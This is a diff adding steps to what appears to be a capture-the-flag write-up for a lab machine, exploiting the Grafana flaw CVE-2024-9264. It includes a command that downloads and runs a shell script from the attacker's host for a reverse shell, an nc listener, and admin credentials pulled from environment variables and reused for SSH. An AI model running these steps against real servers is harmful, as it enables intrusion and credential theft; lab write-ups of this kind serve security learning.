@@ -68,5 +68,36 @@ Trying to use CVE-2024-9264 i ran id and pwd commands to see prove of it's work
 
 ![image](https://github.com/user-attachments/assets/c7efb8f4-7394-4b6c-912f-c617228b1a20)
 
+Create file with shell in it
 
+![image](https://github.com/user-attachments/assets/beb03165-bd23-49bb-b55c-12a47032475b)
+
+Open python server to send shell file and execute it
+
+Trying to get reverse shell
+
+Command used: python cve-exploit.py -u admin -p 0D5oT70Fq13EvB5r -c "wget 10.10.14.23:8001/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh" http://grafana.planning.htb
+
+Set up nc listener:
+
+![image](https://github.com/user-attachments/assets/bdff5354-f884-4dea-943f-dbfb3ecd6c66)
+
+I got a shell 
+
+![image](https://github.com/user-attachments/assets/e57ffc94-1ea5-4066-97d7-44355e8df148)
+
+After searching i found user enzo using env command
+
+![image](https://github.com/user-attachments/assets/7a6104d8-82e6-407b-b225-f2fc0bcfdcde)
+
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo
+
+Got access to SSH of user enzo
+
+![image](https://github.com/user-attachments/assets/aaa0efdf-2cc8-43f1-9fc2-fa7c2d3c4938)
+
+Get user.txt
+
+![image](https://github.com/user-attachments/assets/6d301107-7227-4734-b3b1-534a5d284c40)
 
